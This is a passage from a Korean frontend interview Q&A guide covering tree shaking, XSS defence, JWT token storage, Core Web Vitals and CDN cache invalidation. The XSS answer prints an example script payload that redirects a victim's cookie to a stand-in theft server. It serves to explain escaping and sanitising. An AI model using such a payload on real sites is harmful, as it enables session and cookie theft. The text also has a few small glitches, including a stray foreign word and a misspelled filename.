        - **A:** 크롬 브라우저가 특정 도메인과 맺을 수 있는 동시 HTTP/1.1 커넥션 파이프 한계는 고작 6개로 묶여 있고, 대역폭(Bandwidth 다운로드
          차선)은 한정적입니다. 너무 많은 파일에 Preload 남발 힌트를 주면 최우선 큐(Queue) 라인에 심각한 병목 정체(Contention)가 벌어져, 정작
          중요한 메인 코어 파일들이 함께 막히는 네트워크 고착 다운을 맛보게 됩니다. 진짜 필수 자원으로 엄선해야 합니다.
    * **[꼬리 질문 2]** 그러면 Preconnect와 비슷한 기능인 `dns-prefetch` 는 어떤 역할 차이인가요?
        - **A:** `preconnect`는 DNS 해상(번역) + TCP 악수 + TLS 인증방 전체를 관통해 연결을 완전 개방합니다. 반면에
          `dns-prefetch`는 오직 DNS 호스트 네임 추적(naver.com -> 12.34.56.78 치환) 검색만을 가볍게 뚫어줍니다. 구형 브라우저 호환성을
          위한 폴백(Fallback) 용도이거나 비용이 싼 간단한 주소록 섭외 목적으로 겸비해서 사용합니다.

### 25. 트리 셰이킹 (Tree Shaking)

**Q: 번들 사이즈 최소화를 지향하기 위한 기법인 '트리 셰이킹(Tree Shaking)'의 원리를 설명해주시고, 이것이 ESM 체제에서만 제대로 동작하는 이유를 정적 분석
관점으로 증명해주세요.**

- **A:** 숲에서 죽거나 시든 잎사귀들을 땅에 떨어뜨리듯, 트리 셰이킹은 애플리케이션 프로젝트 구조 내에서 개발자가 선언해놓고 실제 스크립트 런타임에 아무도 부르지 않아 쓰지
  않는 더미 함수(Dead Code)나 컴포넌트들을 최종 빌드 번들 결과물에서 스마트하게 필터링해 도려내는 자동 최적화 기술입니다.
  이 기술의 핵심 알고리즘 체커는 모듈의 의존성 연결 그래프(Dependency Graph) 구조를 **코드가 단 1줄도 실행되지 않는 정적 컴파일(사전 파싱) 시점**에
  100% 명확히 이해하고 구별해내야만 가능한 일입니다. 자바스크립트의 최신 모듈 시스템인 ESM 체제(`import / export`)는 조건부 로딩 구문을 불허하며 무조건
  파일 최상단에만 바인딩 정보가 기재되도록 문법적으로 엄격히 강제됩니다. 덕분에 번들러(Rollup, Webpack) 엔진은 파싱 찰나의 순간에 모든 종속성 지도를 그려내고 배제
  코드를 확정 지을 수 있게 되며, 반대로 동적 `require()` 꼼수가 남발되는 구시대 CommonJS 모듈은 런타임 실행 전에 누구도 코드가 필요한지 여부를 알 수 없어
  체커가 가지치기를 두려워해 포기하기 때문입니다.
  _ **[꼬리 질문 1]** 그러면 내가 ESM으로 깔끔하게 `export const utils` 함수들을 짜놨더라도, `package.json`에서 특정 속성 설정을 빼먹으면
  간혹 웹팩이 번들링 시 이 코드를 덜컥 삭제하기 무서워서 겁먹고 트리셰이킹을 실패하고 몽땅 남겨두는 불상사가 발생합니다. 왜일까요?
  _ **A:** 만약 엔진이 불필요해 보이는 코드를 마음대로 삭제해 버렸는데, 알고 보니 이 모듈이 외부 API로 로그를 쏘거나 윈도우 전역 스코프(
  `window.__debug`)를 오염시키는 예측 불가 행위(Side Effect)를 담고 있었다면 코어 에러가 발생합니다. 따라서 `package.json` 안에 명시적으로
  `"sideEffects": false` 꼬리표를 강제로 부착해 주어 번들러에게 "내 라이브러리 함수들은 주변을 해치지 않는 순수 상태이니 의심 없이 가지치기해도 안전해"라는
  인증서를 제출해야 완벽히 잘려나갑니다.
  _ **[꼬리 질문 2]** 순수 자바스크립트 클래스(`class Widget`)를 바벨(Babel)로 폴리필 컴파일하면 트리 셰이킹이 꼬이거나 망가지는 치명적 문제점(IIFE
  변환)은 무엇인가요?
  _ **A:** 바벨 등 트랜스파일러가 구형 익스플로러 지원을 위해 ES6 클래스를 변환할 때, 변수 은닉을 위해 즉시 실행 함수(IIFE) 패턴 따위로 그 속을 더럽고
  복잡하게 래핑(Wrapping)해버립니다. 번들러 입장에서는 이 미지의 복잡한 익명 함수가 안에서 프로토타입 프로퍼티를 막 변형하는 '사이드 이펙트(오염)' 가능성이 있다고
  두려움을 느껴서 삭제를 회피하게 되며, 이로 인해 객체 가지치기가 마비됩니다.

### 26. 렌더링 위조 보안 및 방어기(XSS)

**Q: XSS(Cross Site Scripting - 교차 사이트 스크립팅) 공격 취약점이 무엇이며, 공격자의 악성 자바스크립트 주입 및 렌더링을 방지하기 위해 프론트엔드
프레임워크나 바닐라 개발자가 이스케이핑(Escaping) 측면에서 지켜야 할 원칙을 설명해주세요.**

- **A:** XSS(Cross Site Scripting)는 공격 무뢰배 해커가 사이트의 게시판 본문 내용 폼이나 댓글 따위에
  `<script>alert('해킹'); document.location='탈취서버?cookie='+document.cookie</script>` 따위의 실제 악성 자바스크립트
  명령어를 텍스트 문자열인 척 몰래 주입(Injection)하여 글을 등록해 두는 초유의 탈취 기법입니다. 불쌍한 유저가 그 글을 클릭해 렌더링하여 읽게 되면, 브라우저 스캐너는
  이것이 문자인지 명령어인지 구분 못해서 곧장 실행해 버리고 유저의 중요 스토리지 토큰을 공격자에게 고스란히 쏴줍니다.
  바닐라 자바스크립트에서는 이 문자열을 렌더링할 때 치명적인 속성인 `innerHTML` 대신 단순 텍스트 삽입 전용인 `innerText`나 `textContent`를 반드시
  써야만 태그 발동을 억제(이스케이핑 변환)할 수 있습니다. 모던한 리액트 렌더러는 중괄호 `{content}` 렌더링 출력부에서 꺽쇠 기호들(`<`, `>`) 등을 `&lt;`
  따위의 HTML 문자 엔티티 기호 형태 문자로 자동 치환해 그려주는 특수 방어 시스템을 기본 탑재하고 있어 안전합니다.
  _ **[꼬리 질문 1]** 그러면 리액트 프레임워크도 막아주지 못하는(사용자가 스스로 바보같이 뚫어버리는 위험한) 리액트 프로퍼티 속성은 대표적으로 어떤 것이 있고 도대체
  어느 상황에 감수하며 써야 할까요?
  _ **A:** 문자열을 문자 엔티티로 안전하게 변환하지 않고 브라우저에 강제 직접 렌더링을 때려 박게 해주는 특별 지시어 구문인
  `dangerouslySetInnerHTML={ { __html: response } }` 속성입니다. 외부의 서식이 풍부한 위지윅 HTML 에디터나 마크다운 변환 결과물을
  그대로 살려서 그려야 할 통제 불가능 상황에서는 불가피하게 쓰게 됩니다.
  _ **[꼬리 질문 2]** 이런 에디터 포맷을 쓸 때 클라이언트 XSS 방어벽 마지막 기점으로서, 대표적으로 프론트엔드에서 삽입할 때 쓰는 서드파티 정화 라이브러리는 무엇이
  있나요?
  _ **A:** 더러운 문자열에서 허용된 포맷 태그(`<b>`, `<i>`) 등 외에 치명적인 `<script>` 찌꺼기를 정규식과 파서로 발라내고 소독(Sanitize)해주는
  라이브러리인 DOMPurify 계열 패키지를 미들웨어로 중간에 주입하고 필터링해 렌더링합니다.

### 27. JWT 인증 및 토큰 스토리지 보안 전략

**Q: JWT(JSON Web Token)의 구조적 한계(탈취 시점 무효화 불가)와 그것을 통제하기 위함인 Access-Refresh 분리 패턴을 브라우저 관점에서 논하시고,
클라이언트 탈취 방지 스토리지 저장 보관소 설계를 제안해주세요.**

- **A:** JWT 토큰은 세션 스토어에 상태를 남기지 않고 Payload(서버가 발행한 암호문 수표) 데이터 안에 이미 신원정보 암호와 유효기간을 다 탑재하고 다녀 서버
  부하(Stateless 장점) 0에 가깝지만, 치명적 맹점은 해커가 토큰 수표 스냅샷을 훔쳐 도망가는 그 순간 서버가 만료 전까지 이 해커 토큰을 서버단에서 스스로 폐기(
  Invalidate)시킬 기능이 전무하다는 점에 있습니다.
  그래서 보통 인가가 짧은 `Access Token(1시간)` + 만료가 긴 갱신용 `Refresh Token(2주)` 구조를 운영합니다. 가장 극강의 스토리지 보관 보안 설계
  방책은, 무조건 JS(XSS 공격 등)로 꺼낼 수 없도록 `HttpOnly` 및 `Secure` 쿠키 체계에 짧은 Access 토큰 만료 스펙을 담아 보내는 체제입니다. 하지만
  간혹 복잡한 이유로 API 인증 Bearer 헤더에 수동으로 달아야 하거나 메모리 자원 통제를 위해, 방어는 약하지만 접근이 쉬운 Local Storage(로컬 저장소), 또는
  리프레시는 `HttpOnly` 쿠키에 숨기고, 액세스는 싱글 탭 JS 내부 프라이빗 메모리 변수에만 들고 다니다가 창을 끄면 아예 토큰 자체가 백지화되도록 지우는 구조도 권장
  혼재 채택합니다.
  _ **[꼬리 질문 1]** 프론트엔드의 SPA 사이트 도메인이 (front.com) 이고 로그인 API 백엔드 호출 도메인이 (api.back.com) 이라고 칠 때, 백엔드
  서버가 `Set-Cookie`로 구워준 `HttpOnly` 인증 쿠키가 프론트 사이트에서 Fetch를 쏠 때 죽어도 딸려 오지 않고 날아가지도 않는 구조적 벽이 터집니다. 왜
  그런가요?
  _ **A:** 서드파티 브라우징 정책과 SameSite의 강력한 방패막이 쿠키입니다. 브라우저 스캐너 입장에서는 api 도메인에서 온 무단 서드파티 쿠키로 규정하므로 이
  십자(Cross) 쿠키가 안 날아갑니다. 그래서 백엔드에서 쿠키를 세팅할 때 `SameSite=None; Secure=true` 속성으로 풀어줘야 하며 프론트의 fetch에서도
  `credentials: 'include'` 옵션 세팅으로 양방 통과 권한을 인가해 주어야만 간신히 쿠키가 달라붙습니다.
  _ **[꼬리 질문 2]** 그러면 토큰이 조용히 만료(401 응답) 되었을 때 화면이 튕기는 무례한 에러를 내지 않고 사용자가 모르게 `Refresh Token`을 실어서 새
  토큰으로 알아서 조용히 갈아입고(`Fetch Token`), 원래 사용자가 눌렀던 이전 요청을 물 흐르듯 되돌려 쏘는(`Retry`) 메커니즘을 React-Query (
  Axios Interceptors 등) 구조에선 어떻게 우아하게 짤 수 있나요?
  _ **A:** Axios 인스턴스의 `response.interceptor.catch()` 인터셉터를 선언해두고, 에러 응답 코드가 401이고 `Token Expired`임이
  확정되면, 하위 제어문에서 원래 진행하려다 막혔던 실패한 `error.config(원래 리퀘스트 구조)`를 임시 변수에 잠깐 대기시킵니다. 그리고 인터셉터가 독자적으로 몰래 또
  다른 `Refresh Token 갱신 통신`을 쏘고 서버로부터 새 따끈한 `Access Token`을 정상 수취하여 `Bearer` 헤더에 덮어 씌우는 체인을 연결합니다. 이후
  잠시 멈춰 대기시켜놨던 첫 번째 `config`를 다시 Axios 슛으로 쏴버려 마무리합니다.

### 28. 성능 정량화 측정 및 지표 방어 (Core Web Vitals)

**Q: 구글이 웹 성능을 정량화한 Core Web Vitals 중, LCP(가장 큰 콘텐츠 렌더), CLS(누적 레이아웃 밀림) 지표가 악화되었을 때 브라우저에서 생기는 특정
현상을 설명하고 개별적 방어 코딩을 설명해주세요.**

- **A:** 구글 검색엔진 최적화(SEO) 등락의 가장 중추적 기둥입니다.
    - **LCP (Largest Contentful Paint)**: 유저가 폰 스크린에 접속하여 눈을 떴을 때, 뷰포트 내의 시야각 화면 젤 윗단에서 텍스트 블록 상자나
      가장 헤비하게 용량을 잡아먹고 있는 간판 배너 그림 하나가 완벽히 그려지는 순간의 밀리초 타겟 지표입니다. 보통 이 LCP 타겟 객체 이미지가 용량이 커서 브라우저가
      그리다 말고 늦어지면 2.5초 지수 등급 밖으로 밀립니다. 이를 방어하려면 절대 이 요소 이미지에는 `<img loading="lazy">` 꼼수를 쓰면 안 되며,
      오히려 HTML 헤드 쪽으로 올려 `<link rel="preload" as="image">` 힌트로 네트워크 상에서 가장 우선 다운로드 패스트 라인을 타도록 보장해야
      그나마 LCP 속도가 보장됩니다.
    - **CLS (Cumulative Layout Shift)**: 화면에 아무리 빨리 콘텐츠가 그려지면 뭣하나요, 유저가 마우스 버튼을 누르려는데 갑자기 뒤에서 늦게
      다운로드된 광고 그림이나 큰 배너 컴포넌트 덩어리가 끼어들어서 전체 레이아웃 요소 상자들을 우르르 밑으로 덜컥 밀어내버리는 사태의 정량 지수입니다. 이 무의미한 지각
      변동 폭주를 막기 위해서는 항상 동적인 외부 이미지나 광고가 내려앉을 예약 뼈대 자리에 미리 `min-height` 및 CSS 속성 종횡비(
      `aspect-ratio: 16/9`) 스켈레톤 홀더 상자 틀을 떡 하니 강제로 잡아두어 유저 화면이 철렁이지 않게 사수해야만 누적 밀림 페널티를 막습니다.

    * **[꼬리 질문 1]** 그러면 자바스크립트가 개입하는 타이밍 지표, 즉 INP(Interaction to Next Paint, 과거 FID 지표) 지표가 나쁘다는 건
      브라우저 스레드의 어떤 코스에서 주로 문제가 생긴 걸까요?
        - **A:** 유저가 마우스 스크롤이나 버튼 클릭 조작을 시도했는데, 공교롭게도 이때 메인 자바스크립트 스레드가 거대하고 블로킹이 극심하게 터지는 Long Task
          동기적 함수 연산이나 배열 루프 따위를 처리하느라 뻗어 있어서 수십 ms 동안 사용자 클릭 통보 신호 자체를 엔진 큐가 씹고 씹어서 대기 렌더링 응답을 주지 못한
          버벅임입니다.
    * **[꼬리 질문 2]** 그러면 INP 불량 응답을 소거하기 위해 이 무거운 메인 스레드 태스크 함수를 자바스크립트 내 코딩으로 어떻게 우아하게 잘게 쪼개어 숨통(
      Yield)을 틔워 버리나요?
        - **A:** 하나의 500ms짜리 통짜 연산 루프로 묶는 대신, 50ms 조각 태스크 단위 배열로 작업을 자른 뒤 스케줄러를 `setTimeout(cb, 0)`
          태스크 큐로 중간중간 넘겨 실행을 고의로 끊어버립니다(Yield to Main Thread 기법). 이러면 루프 조각들 사이마다 이벤트 루프에게 권한이 일시
          반납되어, 브라우저 스케줄러가 중간중간 밀려있는 유저 클릭이나 렌더 응답(UI 블로킹) 이벤트를 여유롭게 처리할 숨통 마디가 열리기 때문에 반응성이 극대화됩니다.

### 29. CDN 글로벌 분산과 정적 에셋 무효화(해시) 전략

**Q: 글로벌 트래픽의 서비스를 이끌어가는 CDN(Content Delivery Network)의 엣지 분산 로딩 원리를 간단히 설명하시고, 새로운 버전을 웹 배포할 때 유저가
낡은 찌꺼기 UI(캐시)를 구경하지 않게 번들러에서 무슨 전략과 꼬리표를 강제 적용시키나요?**

- **A:** 만약 한국의 토스 메인 서버 1대만 존재한다면 미국 호주에서 들어오는 웹 전송 요청은 바다 밑 해저 케이블 라우팅만 수백 ms가 지연(Latency)됩니다. CDN
  엣지 노드는 서비스 회사의 정적 콘텐츠(그림 파일 및 JS 덩어리 묶음) 원본 파일을 자기들 전 세계 인터넷 구석구석 라우터 기지망(Edge Server) 램 메모리 공간에
  수천 군데나 미리 쫙 복사본으로 깔아놓는 캐싱 인프라 자원망을 뜻합니다. 유저는 지구 반대편이 아니라 제일 지리적으로 접속 라우팅이 코 앞에 가까운 노드 컴퓨터로 자동 배정받아
  번갯불처럼 번들을 내려받아 화면을 띄웁니다.
  그러나 এই CDN 캐시가 1년간 보관된다면 프론트 개발자가 새 배포 버전을 푸시해도 엣지는 무단으로 낡은 스냅샷 구버전을 보여줄 것입니다. 따라서 완벽한 Cache
  Invalidation(캐시 파괴와 신 무효화 갱신)을 위해, 웹팩(Vite) 빌더 환경에서는 산출되는 JS 파일명 맨 뒤 꼬리표에 원본 코드 소스의 해시 값을 추출한 난수(
  예: `index.5b1e9c2f.js`)를 달아 아예 파일 이름을 고의로 개명해 배포해 버립니다. HTML에서는 `idex.5b1...js`를 부르므로 엣지 라우터는 파일명이
  바뀌었으니 "새 콘텐츠구나"라고 인지하여 옛날 캐시가 있건 없건 뒤도 안 돌아보고 신버전을 띄워주고 무기한 캐싱합니다.
  _ **[꼬리 질문 1]** 웹팩 번들 이름을 해시(난수)로 지어서 1년 통 캐시(immutable cache)를 먹이는 것이 대원칙인데, 정작 첫 껍데기가 되는
  `index.html` 파일 자체는 `index.dsd2l2.html` 따위로 해시 난수 변환을 해주지 않는 고정 규계를 지킵니다. 이유는요?
  _ **A:** 웹사이트 진입점 시작 통로는 브라우저 URL이 "toss.im" 등 고정된 도메인 루트(index.html) 진입으로 박혀야 하므로, 이 메인 HTML
  파일만큼은 절대로 1년 캐싱을 때리면 무한 먹통이 되어 새로운 자바스크립트 호출 주소 태그 자체(위의 그 해시 태그 꼬리표)를 업데이트받을 매개체가 사라지게 됩니다. 대신 응답
  요청 헤더에 낡은 캐싱 금지(`Cache-Control: no-cache` 등)를 내려보내서 접속 갱신을 받습니다.
  _ **[꼬리 질문 2]** 해시 방식을 써도 배포 속도 등 기타 연유로, CloudFront 등 CDN 서버에 내재된 어드민에서 '명시적 Invalidation 갱신(캐시
  리셋(Purge) 폭파 버튼)'을 API 등 명령을 날려서 CDN 오리진 트랜잭션 수동 정리를 하기도 합니다. 어떤 통제를 거쳐 일어나는 시스템인가요?
  _ **A:** 정적인 파일명의 우아한 치환 기법과 달리, API나 백엔드에서 서빙되는 경로(`/*` 루트 패턴 등)에서 CDN의 캐시 생명 주기를 수동으로 끝장내달라고 엣지
  전파망 시스템에 강점 명령을 날려, 각 국가 지사 캐시 램 메모리에 있는 특정 경로 찌꺼기 램을 고의로 청소시키고 (다소 시간이 무작위로 소요되는 리셋을 겪고) 다음 접속 시
  본 서버에서 다시 퍼오게 강제 인출하는 기능입니다.
